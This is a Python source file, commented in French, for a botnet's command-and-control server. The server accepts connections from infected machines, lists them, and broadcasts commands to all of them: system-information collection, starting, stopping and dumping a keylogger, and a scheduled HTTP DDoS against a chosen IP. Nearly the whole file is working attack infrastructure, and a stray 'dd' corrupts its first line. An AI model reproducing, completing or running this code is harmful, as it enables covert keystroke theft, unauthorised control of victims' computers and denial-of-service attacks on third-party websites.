ddfrom datetime import datetime
from threading import Thread
from random import randint
from time import sleep
from re import match
from os import walk
import argparse
import socket


def write_server_logs(message):
    """Ecris tous les évènements du serveur dans le fichier server_logs.txt
    """
    event_time = str(datetime.today())
    with open("server_logs.txt", "a") as server_logs:
        server_logs.write("[" + event_time[:event_time.find(".")] + "] " + message + "\n")


class Server:
    def __init__(self):
        """Ajout des arguments -q -a -p avec argparse
        Ajout des différentes variables comme le socket, la liste des clients, ...
        + Dictionnaire avec les différentes commandes possibles
        """
        self.parser = argparse.ArgumentParser()
        self.parser.add_argument("--quiet", "-q", action="store_true", help="Désactive la bannière")
        self.parser.add_argument("--address", "-a", type=str, required=True, help="Adresse IP de l'hôte")
        self.parser.add_argument("--port", "-p", type=int, required=True, help="Port de l'hôte")
        self.args = self.parser.parse_args()
        self.ip = self.args.address
        self.port = self.args.port
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.list_sockets = []
        self.list_address = []
        self.commands_list_server = {
            "help": "Affiche l'aide",
            "targets_list": "Liste les machines infectées",
            "poweroff": "Eteind le serveur"
        }
        self.commands_list_client = {
            "get_sys_info()": "Récupère les informations systèmes de toutes les machines connectées",
            "keylogger_start()": "Démarre le keylogger sur toutes les machines connectées",
            "keylogger_stop()": "Arrête le keylogger sur toutes les machines connectées",
            "keylogger_dump(<lines>)": "Récupère (n) lignes des fichiers contenant les frappes du clavier des "
                                       "machines connectées",
            "ddos(ip, <datetime[yyyy-mm-dd hh:mm]>, duration[s])": "Envois aux clients d'attaquer via HTTP telle IP, "
                                                                   "à telle (date) & pendant x secondes (uniquement "
                                                                   "site web)"
        }
        self.on = True

    def banner(self):
        """Démarre la bannière de manière aléatoire en fonction de argparse et de si les fichiers bannière existent
        avec un nom correct (de 1 à n)
        """
        if not self.args.quiet:
            try:
                banner_nb = len(next(walk("banners"))[2])
                random_banner = randint(1, banner_nb)
                with open("banners/" + str(random_banner) + ".txt", "r") as banner_file:
                    print(banner_file.read())
            except StopIteration:
                pass
            except ValueError:
                pass
            except FileNotFoundError:
                pass

    def start_all_thread(self):
        """Fonction qui démarre les deux principaux threads (ListenSockets / CommandSender)
        En vérifiant si l'ip et le port spécifiés dans argparse sont correct via un regex
        """
        regex_ip = "^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5]).){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][" \
                   "0-9]|25[0-5])$"
        regex_port = "^([0-9]{1,4}|[1-5][0-9]{4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])$"
        if match(regex_ip, self.ip) and match(regex_port, str(self.port)):
            listen_thread = ListenSockets(self)
            listen_thread.start()
            command_thread = CommandSender(self)
            command_thread.start()
        else:
            print("Mauvaise IP/Port")
            sleep(3)

    def help(self):
        """Fonction qui affiche la liste des commandes existantes sur le serveur ainsi que
        leur description à partir des dictionnaires initialisés précédemment dans notre Class
        """
        print("")
        print("Commandes Serveur")
        print("========================")
        for command_server in self.commands_list_server.keys():
            print(command_server, ":", self.commands_list_server[command_server])
        print("")
        print("Commandes Clients")
        print("========================")
        for command_client in self.commands_list_client.keys():
            print(command_client, ":", self.commands_list_client[command_client])
        print("")

    def poweroff(self):
        """Fonction qui coupe la connexion de tous les client: client par client
        """
        write_server_logs("Arrêt du serveur")
        for client in self.list_sockets:
            client.close()

    def targets_list(self):
        """Fonction qui affiche la liste des machines infectées par le botnet
        Si aucune machine trouvée, on affiche qu'il n'y a pas de machines infectées
        """
        print("")
        print("Liste des infectés")
        print("========================")
        if not self.list_address:
            print("Aucune machine trouvée")
        else:
            for target in self.list_address:
                print(target)
        print("")


class ListenSockets(Thread):
    def __init__(self, serv):
        """On récupère le serveur afin de pouvoir accéder à ses différents champs / méthodes
        On hérite de la classe threading.Thread
        """
        super().__init__()
        self.serv = serv

    def run(self):
        """On bind l'ip et le port passé en paramètres via argparse au socket
        On attends une connexion via le listen()

        Tant que le serveur est toujours ON, on boucle
            On accepte les machines se connectant + Ajout dans les listes
            On lance le thread de réception pour chaque client
            Si le timeout est dépassé. On rééssaye afin de voir si le serveur est toujours ON

        Si on sort de la boucle, on éteint le serveur
        """
        self.serv.s.bind((self.serv.ip, self.serv.port))
        self.serv.s.listen()
        self.serv.s.settimeout(5)
        write_server_logs("Le serveur est démarré/en écoute ...")
        while self.serv.on:
            try:
                distant_socket, addr = self.serv.s.accept()
                self.serv.list_address.append(addr)
                self.serv.list_sockets.append(distant_socket)
                write_server_logs("+ " + str(addr))
                distant_thread = ClientStart(distant_socket, addr, self.serv)
                distant_thread.start()
            except socket.timeout:
                pass

        self.serv.poweroff()


class ClientStart(Thread):
    def __init__(self, distant_socket, addr, serv):
        """On récupère le serveur afin de pouvoir accéder à ses différents champs / méthodes,
        le socket distant et l'adresse propre à la machine dont la connexion a été acceptée
        On hérite de la classe threading.Thread
        """
        super().__init__()
        self.serv = serv
        self.distant_socket = distant_socket
        self.addr = addr

    def run(self):
        """Fonction qui va réceptionner les messages de la machine dont la connexion a été acceptée

        Tant que la connexion est toujours ouverte sur la machine :
            On essaye de recevoir un message :
                si le client ferme sa connexion, on ferme sa connexion côté serveur
                    et on met à jours les listes des clients
                si nous avions déjà fermé sa connexion via un poweroff, on pass
        """
        while self.distant_socket.fileno() != -1:
            try:
                print(self.distant_socket.recv(1024).decode("utf-8"), end="")
            except ConnectionResetError:
                self.distant_socket.close()
                self.serv.list_address.remove(self.addr)
                write_server_logs("- " + str(self.addr))
                self.serv.list_sockets.remove(self.distant_socket)
            except ConnectionAbortedError:
                pass


class CommandSender(Thread):
    def __init__(self, serv):
        """On récupère le serveur afin de pouvoir accéder à ses différents champs / méthodes
        On hérite de la classe threading.Thread
        On créé une nouvelle liste afin de pouvoir faire des tests sur les commandes sans arguments
        """
        super().__init__()
        self.serv = serv
        self.client_command_checker = []

    def run(self):
        """Fonction qui va vérifier chaque commande et exécuté une action en fonction de celle-ci:

        1. On remplis la liste client_command_checker par les commandes sans les arguments
            depuis le dictionnaire de commandes
        2. On reçois les commandes on les formatant (pas de blanc / lowercase)
        3. Tant que la commande est différente de poweroff
            On test d'abord les commandes serveurs
                --> On fait appel aux différentes fonctions
            Ensuite si ce n'est pas une commande server, on test si c'est une commande cliente
                --> On envois la commande aux clients
            Sinon
                --> Affiche que la commande est inconnue
        4. Si on sort de la boucle, on éteint le serveur
        """
        for element in self.serv.commands_list_client.keys():
            self.client_command_checker.append(element[0:element.find("(") + 1] + element[element.find(")"):])

        command = input("COMMAND > ")
        command = (command.lower()).strip()
        command_without_argument = command[0:command.find("(") + 1] + command[command.find(")"):]

        while command != "poweroff":
            if command in self.serv.commands_list_server:
                if command == "help":
                    self.serv.help()
                elif command == "targets_list":
                    self.serv.targets_list()
            elif command_without_argument in self.client_command_checker:
                for client in self.serv.list_sockets:
                    client.send(command.encode("utf-8"))
            else:
                print("La commande spécifiée n'existe pas")

            command = input("COMMAND > ")
            command = (command.lower()).strip()
            command_without_argument = command[0:command.find("(") + 1] + command[command.find(")"):]

        print("Le serveur va s'arrêter.")
        self.serv.on = False


server = Server()
server.banner()
server.start_all_thread()
